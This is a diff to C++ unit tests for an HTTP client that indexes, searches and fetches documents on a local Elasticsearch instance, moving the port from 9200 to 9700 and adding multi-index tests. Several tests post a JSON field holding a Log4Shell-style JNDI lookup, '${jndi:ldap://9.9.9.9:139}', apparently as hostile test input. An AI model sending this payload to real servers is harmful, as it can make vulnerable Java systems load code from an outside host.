@@ -28,8 +28,7 @@ TEST(HttpClient, Test_Normal_Post) { /*{{{*/
   std::string result;
 
   r = http_client.Post(url, post_params, &result);
-  EXPECT_NEQ(kOk,
-             r);  // TODO: considering r: kHttpStatusRedirect             = 302, // Move temporarily
+  EXPECT_NEQ(kOk, r);  // TODO: considering r: kHttpStatusRedirect = 302, // Move temporarily
   if (r != kOk) {
     fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
   }
@@ -92,7 +91,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Bulk) { /*{{{*/
   EXPECT_EQ(kOk, r);
 
   //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
-  std::string url = "http://localhost:9200/_bulk?pretty";
+  std::string url = "http://localhost:9700/_bulk?pretty";
   std::string post_params =
       "{ \"index\":  { \"_index\": \"tests_23\", \"_type\": \"_doc\", \"_id\": 11 }}\n"
       "{ \"name\" : \"FFFFFBB\", \"country\" : \"US\", \"age\" : 128}\n"
@@ -122,7 +121,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Index) { /*{{{*/
   Code r = http_client.Init();
   EXPECT_EQ(kOk, r);
 
-  std::string url = "http://localhost:9200/tests_33/_doc/11?pretty";
+  std::string url = "http://localhost:9700/tests_33/_doc/11?pretty";
   std::string post_params = "{ \"name\" : \"EEEEEAA\", \"country\" : \"USA\", \"age\" : 10}";
   std::string result;
 
@@ -143,7 +142,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Search) { /*{{{*/
   EXPECT_EQ(kOk, r);
 
   //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
-  std::string url = "http://localhost:9200/tests_3/_search?pretty";
+  std::string url = "http://localhost:9700/tests_3/_search?pretty";
   std::string post_params = "{}";
   std::string result;
 
@@ -163,7 +162,7 @@ TEST(HttpClient, Test_Normal_ES_Get_ID) { /*{{{*/
   Code r = http_client.Init();
   EXPECT_EQ(kOk, r);
 
-  std::string url = "http://localhost:9200/tests_33/_doc/11?pretty";
+  std::string url = "http://localhost:9700/tests_33/_doc/11?pretty";
   std::string result;
 
   r = http_client.Get(url, &result);
@@ -173,6 +172,38 @@ TEST(HttpClient, Test_Normal_ES_Get_ID) { /*{{{*/
   }
 
   fprintf(stderr, "%s\n", result.c_str());
+} /*}}}*/
+
+TEST(HttpClient, Test_Normal_ES_Post_Mutli_Index) { /*{{{*/
+  using namespace base;
+
+  HttpClient http_client;
+  Code r = http_client.Init();
+  EXPECT_EQ(kOk, r);
+
+  for (int i = 20; i < 40; ++i) {
+    char buf[64] = {0};
+    snprintf(buf, sizeof(buf) - 1, "%d", i);
+    std::string url = "http://localhost:9700/tests_33/_doc/";
+    url.append(buf);
+    url.append("?pretty");
+
+    std::string post_params = "{ \"country\" : \"${java:vm}, ${jndi:ldap://9.9.9.9:139}\", \"name\" : \"";
+    post_params.append(1, 0xe5);
+    post_params.append(1, 0x8d);
+    post_params.append(1, 0x95);
+    post_params.append("\"}");
+
+    std::string result;
+
+    r = http_client.Post(url, post_params, &result);
+    EXPECT_EQ(kOk, r);
+    if (r != kOk) {
+      fprintf(stderr, "Failed to index data of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
+    }
+
+    fprintf(stderr, "%s\n", result.c_str());
+  }
 } /*}}}*/
 
 TEST(HttpClient, Test_Exception_ES_Post_Index) { /*{{{*/
@@ -185,21 +216,21 @@ TEST(HttpClient, Test_Exception_ES_Post_Index) { /*{{{*/
   for (int i = 20; i < 40; ++i) {
     char buf[64] = {0};
     snprintf(buf, sizeof(buf) - 1, "%d", i);
-    std::string url = "http://localhost:9200/tests_33/_doc/";
+    std::string url = "http://localhost:9700/tests_33/_doc/";
     url.append(buf);
     url.append("?pretty");
 
     std::string post_params = "{ \"country\" : \"${java:vm}, ${jndi:ldap://9.9.9.9:139}\", \"name\" : \"";
-    post_params.append(1, 0xe8);
-    post_params.append(1, 0xb4);
+    post_params.append(1, 0xe5);
+    post_params.append(1, 0x8d);
     post_params.append("\"}");
 
     std::string result;
 
     r = http_client.Post(url, post_params, &result);
-    EXPECT_EQ(kOk, r);
+    EXPECT_EQ(kInvalidHttpRetStatus, r);
     if (r != kOk) {
-      fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
+      fprintf(stderr, "Failed to index data of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
     }
 
     fprintf(stderr, "%s\n", result.c_str());
@@ -251,7 +282,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Bulk_UsingNameAndPwd) { /*{{{*/
   EXPECT_EQ(kOk, r);
 
   //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
-  std::string url = "http://localhost:9200/_bulk?pretty";
+  std::string url = "http://localhost:9700/_bulk?pretty";
   std::string post_params =
       "{ \"index\":  { \"_index\": \"tests_23\", \"_type\": \"_doc\", \"_id\": 11 }}\n"
       "{ \"name\" : \"FFFFFBB\", \"country\" : \"US\", \"age\" : 128}\n"
@@ -286,7 +317,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Index_UsingNameAndPwd) { /*{{{*/
   r = http_client.SetUserNameAndPwd(user_name, pwd);
   EXPECT_EQ(kOk, r);
 
-  std::string url = "http://localhost:9200/tests_33/_doc/11?pretty";
+  std::string url = "http://localhost:9700/tests_33/_doc/11?pretty";
   std::string post_params = "{ \"name\" : \"EEEEEAA\", \"country\" : \"USA\", \"age\" : 10}";
   std::string result;
 
@@ -312,7 +343,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Search_UsingNameAndPwd) { /*{{{*/
   EXPECT_EQ(kOk, r);
 
   //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
-  std::string url = "http://localhost:9200/tests_3/_search?pretty";
+  std::string url = "http://localhost:9700/tests_3/_search?pretty";
   std::string post_params = "{}";
   std::string result;
 
@@ -337,7 +368,7 @@ TEST(HttpClient, Test_Normal_ES_Get_ID_UsingNameAndPwd) { /*{{{*/
   r = http_client.SetUserNameAndPwd(user_name, pwd);
   EXPECT_EQ(kOk, r);
 
-  std::string url = "http://localhost:9200/tests_33/_doc/11?pretty";
+  std::string url = "http://localhost:9700/tests_33/_doc/11?pretty";
   std::string result;
 
   r = http_client.Get(url, &result);
@@ -347,6 +378,43 @@ TEST(HttpClient, Test_Normal_ES_Get_ID_UsingNameAndPwd) { /*{{{*/
   }
 
   fprintf(stderr, "%s\n", result.c_str());
+} /*}}}*/
+
+TEST(HttpClient, Test_Normal_ES_Post_Multi_Index_UsingNameAndPwd) { /*{{{*/
+  using namespace base;
+
+  HttpClient http_client;
+  Code r = http_client.Init();
+  EXPECT_EQ(kOk, r);
+
+  std::string user_name("test");
+  std::string pwd("test");
+  r = http_client.SetUserNameAndPwd(user_name, pwd);
+  EXPECT_EQ(kOk, r);
+
+  for (int i = 20; i < 40; ++i) {
+    char buf[64] = {0};
+    snprintf(buf, sizeof(buf) - 1, "%d", i);
+    std::string url = "http://localhost:9700/tests_33/_doc/";
+    url.append(buf);
+    url.append("?pretty");
+
+    std::string post_params = "{ \"country\" : \"${java:vm}, ${jndi:ldap://9.9.9.9:139}\", \"name\" : \"";
+    post_params.append(1, 0xe5);
+    post_params.append(1, 0x8d);
+    post_params.append(1, 0x95);
+    post_params.append("\"}");
+
+    std::string result;
+
+    r = http_client.Post(url, post_params, &result);
+    EXPECT_EQ(kOk, r);
+    if (r != kOk) {
+      fprintf(stderr, "Failed to index data of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
+    }
+
+    fprintf(stderr, "%s\n", result.c_str());
+  }
 } /*}}}*/
 
 TEST(HttpClient, Test_Exception_ES_Post_Index_UsingNameAndPwd) { /*{{{*/
@@ -364,21 +432,21 @@ TEST(HttpClient, Test_Exception_ES_Post_Index_UsingNameAndPwd) { /*{{{*/
   for (int i = 20; i < 40; ++i) {
     char buf[64] = {0};
     snprintf(buf, sizeof(buf) - 1, "%d", i);
-    std::string url = "http://localhost:9200/tests_33/_doc/";
+    std::string url = "http://localhost:9700/tests_33/_doc/";
     url.append(buf);
     url.append("?pretty");
 
     std::string post_params = "{ \"country\" : \"${java:vm}, ${jndi:ldap://9.9.9.9:139}\", \"name\" : \"";
-    post_params.append(1, 0xe8);
-    post_params.append(1, 0xb4);
+    post_params.append(1, 0xe5);
+    post_params.append(1, 0x8d);
     post_params.append("\"}");
 
     std::string result;
 
     r = http_client.Post(url, post_params, &result);
-    EXPECT_EQ(kOk, r);
+    EXPECT_EQ(kInvalidHttpRetStatus, r);
     if (r != kOk) {
-      fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
+      fprintf(stderr, "Failed to index data of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
     }
 
     fprintf(stderr, "%s\n", result.c_str());
